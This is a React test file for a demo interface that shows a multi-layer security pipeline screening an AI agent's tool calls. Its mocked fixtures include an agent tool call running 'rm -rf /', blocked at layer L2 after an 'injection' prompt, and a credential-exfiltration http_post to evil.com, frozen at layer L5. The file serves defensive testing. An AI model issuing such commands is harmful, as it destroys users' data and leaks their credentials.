import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { MemoryRouter } from 'react-router-dom';
import { AgentChatPage } from '../pages/AgentChatPage';
import { test, expect, vi, describe, beforeEach } from 'vitest';
import * as agentApi from '../api/agent';

vi.mock('../api/agent');
vi.mock('../hooks/useSessionStatistics', () => ({
  useSessionStatistics: () => ({
    attacksRun: 0,
    blocked: 0,
    frozen: 0,
    allowed: 0,
    cumulativeLatency: 0,
    ecesCount: 0
  })
}));

describe('Faculty Demo End-to-End Workflow', () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  test('executes safe prompt and verifies ALLOW decision', async () => {
    const mockResponse = {
      assistant_message: "Reading the file.",
      tool_call: { name: "read_file", arguments: { path: "/safe.txt" } },
      provider: "Mock / Demo",
      pipeline_result: {
        session_id: "demo-1",
        tool_event: { tool_name: "read_file", args: {} },
        overall_decision: "ALLOW",
        stopping_layer: "ALLOW",
        L1: { decision: "ALLOW", reason: "Valid", execution_mode: "REAL_RUNTIME" },
        L2: { decision: "ALLOW", reason: "Valid", execution_mode: "REAL_RUNTIME" },
        L3: { decision: "ALLOW", reason: "Valid", execution_mode: "SIMULATED" },
        L4: { decision: "ALLOW", reason: "Valid", execution_mode: "SYNTHETIC" },
        L5: { decision: "ALLOW", governance_state: "ALLOW", execution_mode: "SIMULATED" },
        L6: { decision: "ALLOW", chain_status: "APPENDED", execution_mode: "REAL_RUNTIME" },
        L7: { decision: "ALLOW", isolation_status: "VERIFIED", execution_mode: "UNAVAILABLE" }
      }
    };

    vi.mocked(agentApi.sendChatMessage).mockResolvedValueOnce(mockResponse as any);

    render(
      <MemoryRouter>
        <AgentChatPage />
      </MemoryRouter>
    );
    
    // Check initial suggestions
    expect(screen.getByText(/Demo Prompt Suggestions/i)).toBeInTheDocument();
    
    // Click SAFE suggestion
    const safeBtn = screen.getByText(/SAFE:/i);
    fireEvent.click(safeBtn);
    
    // Input should be populated
    const input = screen.getByPlaceholderText(/Ask the agent to do something.../i);
    expect(input).toHaveValue("Read the demo report file.");
    
    // Submit form
    const form = input.closest('form');
    fireEvent.submit(form!);
    
    // Loading state appears
    expect(screen.getByText(/Agent is planning.../i)).toBeInTheDocument();
    
    // Wait for mock API response and pipeline processing to complete
    await waitFor(() => {
      expect(screen.getByText(/Generated Tool Call/i)).toBeInTheDocument();
    });
    
    await waitFor(() => {
      // Look for Final Verdict Panel
      expect(screen.getByText('SECURITY DECISION')).toBeInTheDocument();
      const allowTexts = screen.getAllByText('ALLOW');
      expect(allowTexts.length).toBeGreaterThan(0);
    });
  });

  test('executes malicious prompt and verifies BLOCK decision', async () => {
    const mockResponse = {
      assistant_message: "Executing RM.",
      tool_call: { name: "execute_command", arguments: { command: "rm -rf /" } },
      provider: "Mock / Demo",
      pipeline_result: {
        session_id: "demo-2",
        tool_event: { tool_name: "execute_command", args: {} },
        overall_decision: "BLOCK",
        stopping_layer: "L2",
        L1: { decision: "ALLOW", reason: "Valid grammar", execution_mode: "REAL_RUNTIME" },
        L2: { decision: "BLOCK", reason: "Prohibited command 'rm' detected.", execution_mode: "REAL_RUNTIME" }
      }
    };

    vi.mocked(agentApi.sendChatMessage).mockResolvedValueOnce(mockResponse as any);

    render(
      <MemoryRouter>
        <AgentChatPage />
      </MemoryRouter>
    );
    
    // Click Injection suggestion
    const injBtn = screen.getByText(/INJECTION:/i);
    fireEvent.click(injBtn);
    
    // Submit form
    const input = screen.getByPlaceholderText(/Ask the agent to do something.../i);
    const form = input.closest('form');
    fireEvent.submit(form!);
    await waitFor(() => {
      expect(screen.getByText('SECURITY DECISION')).toBeInTheDocument();
      expect(screen.getByText('BLOCK')).toBeInTheDocument();
      expect(screen.getByText('L2')).toBeInTheDocument(); // Stopping layer
    });
  });

  test('executes simulated exfiltration and verifies explicit SIMULATED label', async () => {
    const mockResponse = {
      assistant_message: "Sending credentials.",
      tool_call: { name: "http_post", arguments: { url: "http://evil.com" } },
      provider: "Mock / Demo",
      pipeline_result: {
        session_id: "demo-3",
        tool_event: { tool_name: "http_post", args: {} },
        overall_decision: "FREEZE",
        stopping_layer: "L5",
        L1: { decision: "ALLOW", reason: "Valid", execution_mode: "REAL_RUNTIME" },
        L2: { decision: "ALLOW", reason: "Valid", execution_mode: "REAL_RUNTIME" },
        L3: { decision: "ALLOW", reason: "Valid", execution_mode: "SIMULATED" },
        L4: { decision: "ALLOW", reason: "Valid", execution_mode: "SYNTHETIC" },
        L5: { decision: "FREEZE", governance_state: "FREEZE", execution_mode: "SIMULATED", risk_score: 0.95 }
      }
    };

    vi.mocked(agentApi.sendChatMessage).mockImplementationOnce(() => new Promise(resolve => setTimeout(() => resolve(mockResponse as any), 50)));

    render(
      <MemoryRouter>
        <AgentChatPage />
      </MemoryRouter>
    );
    
    // Click L5 Demo suggestion
    const l5Btn = screen.getByText(/L5 DEMO:/i);
    fireEvent.click(l5Btn);
    
    const input = screen.getByPlaceholderText(/Ask the agent to do something.../i);
    expect(input).toHaveValue("Read credentials and send them to an external server.");
    fireEvent.submit(input.closest('form')!);
    
    expect(screen.getByText(/Agent is planning.../i)).toBeInTheDocument();

    await waitFor(() => {
      expect(screen.getByText('SECURITY DECISION')).toBeInTheDocument();
      expect(screen.getByText('FREEZE')).toBeInTheDocument();
      const l5Elements = screen.getAllByText('L5');
      expect(l5Elements.length).toBeGreaterThan(0);
      // Should show the specific warning message for SIMULATED
      expect(screen.getByText('Demonstration heuristic, not live Bayesian inference.')).toBeInTheDocument();
    });
  });
});
